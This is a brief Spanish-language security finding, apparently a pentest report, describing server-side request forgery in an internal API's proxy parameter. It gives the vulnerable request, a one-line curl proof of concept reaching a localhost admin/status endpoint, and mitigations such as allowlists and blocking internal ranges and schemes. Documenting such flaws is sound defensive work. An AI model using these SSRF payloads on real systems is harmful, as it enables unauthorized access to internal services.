# SSRF en API interna expuesta

**Fecha:** Julio 2025  
**Vulnerabilidad:** Server-Side Request Forgery  
**Target:** Aplicación interna con microservicios  
**Impacto:** Acceso a recursos internos sin autenticación

---

## 🔍 Vector encontrado

Parámetro vulnerable:

```
GET /proxy?url=http://127.0.0.1:8000/admin
```

---

## 💥 Prueba de concepto

```bash
curl "https://target.com/proxy?url=http://127.0.0.1:8000/status"
```

---

## 🛡️ Recomendación

- Validar dominios (allowlist)
- Bloquear IPs internas (`127.0.0.0/8`, `169.254.0.0/16`)
- Filtrar esquemas como `file://`, `ftp://`, `gopher://`
